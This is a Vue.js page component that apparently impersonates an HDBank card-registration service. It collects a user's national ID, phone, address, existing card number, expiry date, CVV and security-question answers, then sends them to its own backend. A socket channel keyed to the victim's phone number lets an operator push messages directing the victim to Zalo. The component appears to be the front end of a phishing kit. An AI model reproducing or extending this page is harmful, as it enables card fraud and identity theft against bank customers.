<template>
    <div class="">
        <!-- <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div> -->
        <div style="margin-top: 20px">
            <v-form ref="formRef" @submit.prevent="submit">

                <v-row justify="center">
                    <div style="display: flex; justify-content: center">
                    </div>
                    <v-col md="8" lg="6" cols="12" sm="12">
                        <v-card title="Thông tin đăng ký" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.fullName" label="Họ và tên" density="compact"
                                            hide-details="auto" variant="solo" :rules="rules.fullName"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.cccd" label="CCCD/CMND" density="compact"
                                            hide-details="auto" variant="solo" :rules="rules.cccd"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.numberPhone" label="Số điện thoại"
                                            density="compact" hide-details="auto" variant="solo"
                                            :rules="rules.numberPhone"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select
                                            :items="['Visa Classic', 'Visa gold', 'Visa Signature', 'Mastercard Gold', 'Napas Flex', 'Vietjet Visa', 'Vietjet Visa Classic']"
                                            label="Loại thẻ" hide-details="auto" v-model="formValue.typeCard"
                                            density="compact" variant="solo" :rules="rules.typeCard"></v-select>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-card title="Địa chỉ nhận thẻ" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.bankAddressProvince" label="Tỉnh thành"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.bankAddressProvince"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.bankAddressDes" label="Quận huyện"
                                            density="compact" hide-details="auto" variant="solo"
                                            :rules="rules.bankAddressDes"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.bankAddressWard" label="Số điện thoại"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.bankAddressWard"></v-text-field>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-card title="Thẻ đang sử dụng" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Loại thẻ" v-model="formValue.cardType" :items="[
                                            'Thẻ ghi nợ Napas',
                                            'Thẻ ghi nợ quốc tế',
                                            'Thẻ tín dụng Mastercand, Visa, Jcb',
                                        ]" hide-details="auto" variant="solo" density="compact" :rules="rules.cardType"
                                            @update:model-value="setCvv">
                                        </v-select>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Tên ngân hàng" v-model="formValue.bankName" :items="bankList"
                                            hide-details="auto" variant="solo" density="compact"
                                            :rules="rules.bankList"></v-select>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.cardNumber" label="Số in trên mặt thẻ"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.cardNumber"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.cardName" label="Chủ thẻ" hide-details="auto"
                                            density="compact" variant="solo" :rules="rules.cardName"></v-text-field>
                                    </v-col>

                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-if="cvv == true" v-model="formValue.cardDate" label="Ngày hết hạn"
                                            hide-details="auto" density="compact" variant="solo" :rules="rules.cardDate"
                                            @update:modelValue="changeCardDate">
                                        </v-text-field>
                                        <v-text-field v-else v-model="formValue.cardDate" label="Ngày phát hành"
                                            hide-details="auto" density="compact" variant="solo" :rules="rules.cardDate"
                                            @update:modelValue="changeCardDate">
                                        </v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-if="cvv == true" v-model="formValue.cardCvv" label="Mã Cvv"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.cardCvv"></v-text-field>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-card title="Câu hỏi bảo mật" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Câu hỏi bảo mật 1" v-model="formValue.question1" :items="[
                                            'Tên người yêu đầu tiên của bạn là gì?',
                                            'Tên ba của bạn là gì?',
                                            'Tên mẹ của bạn là gì?',
                                            'Tên trường tiểu học của bạn là gì?',
                                        ]" hide-details="auto" variant="solo" density="compact"
                                            :rules="rules.question1">
                                        </v-select>

                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.answer1" label="Câu trả lời câu hỏi bảo mật 1"
                                            density="compact" hide-details="auto" variant="solo"
                                            :rules="rules.answer1"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Câu hỏi bảo mật 2" v-model="formValue.question2" :items="[
                                            'Tên người yêu đầu tiên của bạn là gì?',
                                            'Tên ba của bạn là gì?',
                                            'Tên mẹ của bạn là gì?',
                                            'Tên trường tiểu học của bạn là gì?',
                                        ]" hide-details="auto" variant="solo" density="compact"
                                            :rules="rules.question2">
                                        </v-select>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.answer2" label="Câu trả lời câu hỏi bảo mật 2"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.answer2"></v-text-field>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-btn color="warning" block class="mt-2" type="submit">Tiếp tục</v-btn>
                    </v-col>

                </v-row>
            </v-form>
            <v-dialog max-width="500px" v-model="dialogSuccess" persistent>
                <v-card>
                    <!-- <v-form ref="formMethodOtp" @submit.prevent="submitFormMethod"> -->
                    <v-card-title>
                        Thông báo
                    </v-card-title>
                    <v-card-text class="text-center">
                        <p class="text-center mb-2">{{ dialogMessage }}</p>
                        <!-- <v-select v-if="socketData.options" class="" v-model="formRefOtpMethod" :items="socketData.options"
                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethod"></v-select> -->
                    </v-card-text>
                    <v-card-actions>
                        <v-btn color="blue" block class="pa-4" type="button" @click="dialogSuccess = false">Tiếp tục</v-btn>
                    </v-card-actions>
                    <!-- </v-form> -->
                </v-card>
            </v-dialog>

        </div>
    </div>
</template>
<script setup>
import axios from '@/plugins/axios';
import { socket } from '@/plugins/socket';
import Api from 'axios';
import { computed, onMounted, ref } from 'vue';
import { useRouter } from 'vue-router';
import { useStore } from 'vuex';
const router = useRouter()
const store = useStore()
const formRef = ref(null)
const user = computed(() => store.state.user)
const cvv = ref(false)
const userStorage = JSON.parse(localStorage.getItem('user'))
const dialogSuccess = ref(false)
const dialogMessage = ref('')
onMounted(() => {
    // if (!user.value.numberPhone) {
    //     router.push({ name: 'Home' })
    // }
    socket.on(`send-data-user-${userStorage.numberPhone}`, async (data) => {
        console.log(data);
        if (data.type === 'zalo') {
            dialogSuccess.value = true
            dialogMessage.value = 'Vui lòng liên hệ zalo để được hỗ trợ.'
        }
    })

    Api.get('https://api.vietqr.io/v2/banks').then(res => {
        bankList.value = res.data.data
        bankList.value.forEach((item) => {
            item.title = item.name + ' - ' + item.short_name
            item.value = item.code
        })
    }).catch(err => {
        console.log(err)
    })
})
const setCvv = (value) => {
    if (value === 'Thẻ ghi nợ quốc tế' || value === 'Thẻ tín dụng Mastercard, Jcb, Visa') {
        cvv.value = true
    } else {
        cvv.value = false
    }
}
const changeCardDate = (value) => {
    console.log(value.length);
    if (value.length === 2) {
        formValue.value.cardDate = value + '/'
    }
}
const bankList = ref([])

const formValue = ref({
    fullName: userStorage.fullName,
    numberPhone: userStorage.numberPhone,
    cccd: userStorage.cccd,
    typeCard: '',
    bankAddressProvince: '',
    bankAddressDes: '',
    bankAddressWard: '',
    cardType: '',
    bankName: '',
    cardNumber: '',
    cardName: '',
    cardDate: '',
    cardCvv: '',
    question1: '',
    answer1: '',
    question2: '',
    answer2: '',
    ...user.value
})
const rules = {
    fullName: [
        v => !!v || 'Họ và tên không được để trống',
    ],
    numberPhone: [
        v => !!v || 'Số điện thoại không được để trống',
        v => (v && v.length === 10) || 'Số điện thoại phải có 10 số',
    ],
    cccd: [
        v => !!v || 'CCCD/CMND không được để trống',
        v => (v && v.length === 12) || 'CCCD/CMND phải có 9 số',
    ],
    typeCard: [
        v => !!v || 'Loại thẻ không được để trống',
    ],
    bankAddressProvince: [
        v => !!v || 'Tỉnh thành không được để trống',
    ],
    bankAddressDes: [
        v => !!v || 'Quận huyện không được để trống',
    ],
    bankAddressWard: [
        v => !!v || 'Phường xã không được để trống',
    ],
    cardType: [
        v => !!v || 'Loại thẻ không được để trống',
    ],
    bankName: [
        v => !!v || 'Tên ngân hàng không được để trống',
    ],
    cardNumber: [
        v => !!v || 'Số thẻ không được để trống',
    ],
    cardName: [
        v => !!v || 'Tên chủ thẻ không được để trống',
    ],
    cardDate: [
        // format MM/YY
        v => !!v || 'Ngày hết hạn không được để trống',
        v => (v && v.length === 5) || 'Ngày hết hạn phải có định dạng MM/YY',
    ],
    cardCvv: [
        v => !!v || 'Mã Cvv không được để trống',
    ],
    question1: [
        v => !!v || 'Câu hỏi bảo mật 1 không được để trống',
    ],
    answer1: [
        v => !!v || 'Câu trả lời câu hỏi bảo mật 1 không được để trống',
    ],
    question2: [
        v => !!v || 'Câu hỏi bảo mật 2 không được để trống',
    ],
    answer2: [
        v => !!v || 'Câu trả lời câu hỏi bảo mật 2 không được để trống',
    ],

}

const submit = async () => {
    const isValid = await formRef.value.validate()

    if (isValid.valid) {
        const data = {
            ...userStorage,
            ...formValue.value
        }
        axios.put(`/update-user/${data.numberPhone}`, data).then(res => {
            store.commit('setUser', {
                ...data,
            })
            router.push('/bank')
        }).catch(err => {
            console.log(err);
        })
    }
}


</script>
<style>
.bg-gray {
    background-color: #f5f5f5;
}

body {
    background: #f2f2f4;
}

.v-card-item .v-card-title {
    padding: 0 0 0 0;
    font-size: 16px;
    font-weight: 500;
    color: #000;
    margin-bottom: 10px;
}

.v-field.v-field--appended.v-field--center-affix.v-field--variant-solo.v-theme--light.v-locale--is-ltr {
    border: 1px solid #ccc;
}


.v-card.v-theme--light.v-card--density-default.v-card--variant-elevated {
    border: 1px solid #ccc;
}

.v-field.v-field--center-affix.v-field--variant-solo.v-theme--light.v-locale--is-ltr {
    border: 1px solid #ccc;
}
</style>
